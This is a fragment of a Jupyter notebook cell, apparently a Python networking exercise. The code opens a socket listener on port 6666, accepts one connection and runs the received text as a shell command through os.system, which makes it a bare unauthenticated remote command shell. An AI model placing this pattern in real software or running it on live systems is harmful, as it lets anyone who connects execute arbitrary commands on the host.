    "import socket\n",
    "import os\n",
    "s=socket.socket()\n",
    "host=socket.gethostname()\n",
    "port=6666\n",
    "s.bind((host,port))\n",
    "s.listen(5)\n",
    "print(\"waiting for connection...\")\n",
    "socket_connection , address= s.accept()\n",
    "\n",
    "while True:\n",
    "   cmd=socket_connection.recv(1024).decode()\n",
    "   print(os.system(cmd))\n",
    "   break\n"
   ]
  }
